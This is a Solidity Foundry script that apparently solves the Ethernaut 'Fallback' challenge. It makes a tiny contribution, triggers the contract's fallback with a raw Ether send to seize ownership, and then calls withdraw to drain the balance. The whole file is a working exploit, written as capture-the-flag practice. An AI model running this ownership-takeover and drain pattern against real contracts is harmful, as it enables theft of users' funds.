// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackScript is Script {

    Fallback public fallbackEx;

    constructor() {
        fallbackEx = Fallback(payable(vm.envAddress("FALLBACK_INSTANCE")));
    }

    function setUp() public {}

    function run() public {
        uint256 pk = vm.envUint("PK");
        vm.startBroadcast(pk);
        fallbackEx.contribute{value: 1}();
        (bool sent,) = payable(fallbackEx).call{value:1}("");
        require(sent, "Failed to send Ether");
        fallbackEx.withdraw();
        vm.stopBroadcast();
    }

    // forge script script/fallback.s.soll:FallbackScript --broadcast
}
